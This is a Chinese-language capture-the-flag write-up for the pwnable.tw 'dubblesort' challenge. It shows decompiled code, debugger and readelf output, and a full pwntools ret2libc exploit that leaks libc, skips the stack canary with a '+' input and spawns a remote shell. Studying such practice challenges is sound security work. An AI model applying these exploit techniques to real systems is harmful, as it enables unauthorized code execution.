# pwnable.tw dubblesort wp

首先查看文件

emmm保护全开

然后分析程序逻辑

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int *v4; // edi
  unsigned int v5; // esi
  unsigned int v6; // esi
  int v7; // ST08_4
  int result; // eax
  unsigned int v9; // [esp+18h] [ebp-74h]
  int v10; // [esp+1Ch] [ebp-70h]
  char buf; // [esp+3Ch] [ebp-50h]
  unsigned int v12; // [esp+7Ch] [ebp-10h]

  v12 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, "What your name :");
  read(0, &buf, 0x40u);                         // 溢出
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &v9);
  v3 = v9;
  if ( v9 )
  {
    v4 = &v10;
    v5 = 0;
    do
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      ++v5;
      v3 = v9;
      ++v4;
    }
    while ( v9 > v5 );
  }
  dubblesort((unsigned int *)&v10, v3);
  puts("Result :");
  if ( v9 )
  {
    v6 = 0;
    do
    {
      v7 = *(&v10 + v6);
      __printf_chk(1, "%u ");
      ++v6;
    }
    while ( v9 > v6 );
  }
  result = 0;
  if ( __readgsdword(0x14u) != v12 )
    sub_BA0();
  return result;
}
```

很明显在

```c
 read(0, &buf, 0x40u);                         // 溢出
 __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
```

处存在溢出并可以leak栈上数据

在下面代码处v9可以有整数溢出（这题我的解法没有用到，负数会使dubblesort函数的处理出错）

```c
 __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
 __isoc99_scanf("%u", &v9);
```

在下面代码中

```c
  __printf_chk(1, "Enter the %d number : ");
  fflush(stdout);
  __isoc99_scanf("%u", v4);
```

当输入"+-"这类数字本身中就有（"+-"代表正负）的字符，则输出栈上数据
	当输入"abc......"这类非法字符，因为输入流问题，这里没有成功scanf，便不断printf数据

```c
	dubblesort((unsigned int *)&v10, v3);
```

dubblesort就是将栈上的数据从小到大冒泡排序

利用思路：

给了libc，可以ret2libc

在cannary的位置输入'+'来保持cannary，在cannary前输入0，cannary后输入system_addr,在return_addr后输入bin_sh_addr

首先leak libc基址

```
12:0048│ ecx esi  0xffffd1ec ◂— 'AAAA\n'
13:004c│          0xffffd1f0 ◂— 0xa /* '\n' */
14:0050│          0xffffd1f4 —▸ 0xf7fa7000 ◂— 0x1d9d6c
15:0054│          0xffffd1f8 —▸ 0xf7dfea89 ◂— add    ebx, 0x1a8577
16:0058│          0xffffd1fc —▸ 0xf7faa588 ◂— 0x0
17:005c│          0xffffd200 —▸ 0xf7fa7000 ◂— 0x1d9d6c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x56555000 0x56556000 r-xp     1000 0      /root/ctf/pwnable.tw/dubblesort/dubblesort
0x56556000 0x56557000 r--p     1000 0      /root/ctf/pwnable.tw/dubblesort/dubblesort
0x56557000 0x56558000 rw-p     1000 1000   /root/ctf/pwnable.tw/dubblesort/dubblesort
0xf7dcd000 0xf7de6000 r--p    19000 0      /usr/lib32/libc-2.28.so
0xf7de6000 0xf7f34000 r-xp   14e000 19000  /usr/lib32/libc-2.28.so
0xf7f34000 0xf7fa4000 r--p    70000 167000 /usr/lib32/libc-2.28.so
0xf7fa4000 0xf7fa5000 ---p     1000 1d7000 /usr/lib32/libc-2.28.so
0xf7fa5000 0xf7fa7000 r--p     2000 1d7000 /usr/lib32/libc-2.28.so
0xf7fa7000 0xf7fa8000 rw-p     1000 1d9000 /usr/lib32/libc-2.28.so
0xf7fa8000 0xf7fab000 rw-p     3000 0      
0xf7fcd000 0xf7fcf000 rw-p     2000 0      
0xf7fcf000 0xf7fd2000 r--p     3000 0      [vvar]
0xf7fd2000 0xf7fd4000 r-xp     2000 0      [vdso]
0xf7fd4000 0xf7fd5000 r--p     1000 0      /usr/lib32/ld-2.28.so
0xf7fd5000 0xf7ff1000 r-xp    1c000 1000   /usr/lib32/ld-2.28.so
0xf7ff1000 0xf7ffb000 r--p     a000 1d000  /usr/lib32/ld-2.28.so
0xf7ffc000 0xf7ffd000 r--p     1000 27000  /usr/lib32/ld-2.28.so
0xf7ffd000 0xf7ffe000 rw-p     1000 28000  /usr/lib32/ld-2.28.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]

```

先看本地libc的0xf7fa7000是什么，然后找到远程libc对应的偏移

```python
>>> hex(0xf7fa7000 - 0xf7dcd000)
'0x1da000'
root@kotori:~/ctf/pwnable.tw/dubblesort# readelf -S /usr/lib32/libc-2.28.so|grep 1da000
  [30] .got.plt          PROGBITS        001da000 1d9000 000038 04  WA  0   0  4
root@kotori:~/ctf/pwnable.tw/dubblesort# readelf -S libc_32.so.6 |grep .got.plt
  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4

```

可知远程的偏移是0x1b0000

然后找system偏移和bin/sh偏移

```
root@kotori:~/ctf/pwnable.tw/dubblesort# readelf -s libc_32.so.6 |grep system
   245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
root@kotori:~/ctf/pwnable.tw/dubblesort# hexdump -C ./libc_32.so.6|grep  /bin -A 1
00158e80  74 6f 64 5f 6c 2e 63 00  2d 63 00 2f 62 69 6e 2f  |tod_l.c.-c./bin/|
00158e90  73 68 00 65 78 69 74 20  30 00 63 61 6e 6f 6e 69  |sh.exit 0.canoni|

```

最后的exp如下：

```python
from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
    p = process('./dubblesort')
else:
    p = remote("chall.pwnable.tw",10101)

got = 0x1b0000
system = 0x3a940
bin_sh = 0x158e8b

p.recv()
p.sendline('a'*24)
got_addr = u32(p.recv()[30:34])-0xa
libc_addr = got_addr-got
system_addr = libc_addr + system
bin_sh_addr = libc_addr + bin_sh
p.sendline('35')
p.recv()
for i in range(24):
    p.sendline('0')
    p.recv()
p.sendline('+')
p.recv()
for i in range(9):
    p.sendline(str(system_addr))
    p.recv()
p.sendline(str(bin_sh_addr))
p.recv()
p.interactive()
```

